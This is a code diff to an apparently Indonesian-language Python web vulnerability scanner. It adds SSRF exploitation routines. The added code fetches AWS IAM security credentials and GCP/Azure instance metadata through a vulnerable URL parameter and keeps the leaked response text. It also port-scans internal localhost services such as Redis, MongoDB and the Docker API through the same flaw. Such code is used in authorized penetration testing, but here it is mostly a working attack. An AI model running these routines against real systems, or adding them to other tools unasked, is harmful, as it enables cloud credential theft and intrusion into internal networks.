@@ -154,6 +154,20 @@ def probe_ssrf(base: str,
                 _ = r.status_code
             except Exception:
                 continue
+            if listener.hit:
+                listener.stop()
+                return [{
+                    "severity": "CRITICAL",
+                    "title": "SSRF terkonfirmasi (callback out-of-band)",
+                    "endpoint": payload_url,
+                    "vuln_url": payload_url,
+                    "vuln_param": p,
+                    "evidence": (
+                        f"Server melakukan request balik ke callback "
+                        f"({listener.hits[0]}). Parameter `{p}` dapat digunakan "
+                        f"untuk menarik resource internal/cloud metadata."
+                    ),
+                }]
 
     listener.stop()
     if listener.hit:
@@ -171,4 +185,100 @@ def probe_ssrf(base: str,
     else:
         debug("Tidak ada callback; SSRF tidak terkonfirmasi")
 
+    return findings
+
+
+# --- exploitation SSRF: cloud metadata + port internal ---
+
+AWS_META = "http://169.254.169.254/latest/meta-data/"
+GCP_META = "http://metadata.google.internal/computeMetadata/v1/"
+AZURE_META = ("http://169.254.169.254/metadata/instance?"
+              "api-version=2021-02-01")
+
+INTERNAL_PORTS = [
+    (80, "http"), (443, "https"), (3306, "MySQL"), (5432, "PostgreSQL"),
+    (6379, "Redis"), (27017, "MongoDB"), (9200, "Elasticsearch"),
+    (8080, "http-alt"), (8000, "http"), (5000, "Flask/API"), (22, "SSH"),
+    (2375, "Docker API"), (2376, "Docker TLS"), (7001, "WebLogic"),
+    (9443, "Kubernetes"),
+]
+
+METADATA_MARKERS = [
+    "accesskeyid", "secretaccesskey", "token", "iam", "role", "instance-id",
+    "ami-id", "projectid", "authorization",
+]
+
+
+def _fetch_through(base: str, client, vuln_url: str, vuln_param: str,
+                   target: str, timeout: float = 8.0):
+    """Fetch URL internal melalui parameter SSRF yang rentan."""
+    payload = _inject(vuln_url, vuln_param, target)
+    try:
+        r = client.get(payload, timeout=timeout)
+        return r.status_code, r.text
+    except Exception:
+        return None, ""
+
+
+def exploit_metadata(base: str, client, vuln_url: str, vuln_param: str) -> List[Dict]:
+    """Coba ambil metadata cloud (AWS/GCP/Azure) lewat SSRF."""
+    findings = []
+    targets = [
+        ("AWS IAM", AWS_META + "iam/security-credentials/"),
+        ("AWS metadata", AWS_META),
+        ("GCP metadata", GCP_META),
+        ("Azure metadata", AZURE_META),
+    ]
+    for name, url in targets:
+        code, body = _fetch_through(base, client, vuln_url, vuln_param, url)
+        if code is None:
+            continue
+        body_l = body.lower()
+        if code == 200 and any(m in body_l for m in METADATA_MARKERS):
+            findings.append({
+                "severity": "CRITICAL",
+                "title": f"Cloud metadata terekspos via SSRF ({name})",
+                "endpoint": vuln_url,
+                "evidence": f"Berhasil menarik {url} -> {body[:300]}",
+            })
+            ok(f"Cloud metadata {name} terekspos via SSRF!")
+            break
+    return findings
+
+
+def scan_internal_ports(base: str, client, vuln_url: str, vuln_param: str,
+                        timeout: float = 6.0) -> List[Dict]:
+    """Scan port internal umum via SSRF (localhost)."""
+    findings = []
+    open_ports = []
+    for port, service in INTERNAL_PORTS:
+        url = f"http://127.0.0.1:{port}/"
+        code, body = _fetch_through(base, client, vuln_url, vuln_param, url, timeout)
+        if code is None:
+            continue
+        # 502/503/504 = gateway error -> port tertutup (SSRF fetch gagal konek)
+        if code in (502, 503, 504):
+            continue
+        if code in (200, 301, 302, 401, 403) or len(body) > 0:
+            open_ports.append((port, service, code, body[:120]))
+    if open_ports:
+        findings.append({
+            "severity": "HIGH",
+            "title": "Port internal terekspos via SSRF (localhost)",
+            "endpoint": vuln_url,
+            "evidence": "; ".join(
+                f"{p} {s} (status {c})" for p, s, c, _ in open_ports[:10]),
+        })
+        ok(f"SSRF: {len(open_ports)} port internal terbuka di localhost")
+    else:
+        debug("SSRF: tidak ada port internal terbuka")
+    return findings
+
+
+def exploit_ssrf(base: str, client, vuln_url: str, vuln_param: str) -> List[Dict]:
+    """Eksploitasi SSRF: cloud metadata + port scan internal."""
+    findings = []
+    info("=== SSRF EXPLOIT ===")
+    findings.extend(exploit_metadata(base, client, vuln_url, vuln_param))
+    findings.extend(scan_internal_ports(base, client, vuln_url, vuln_param))
     return findings
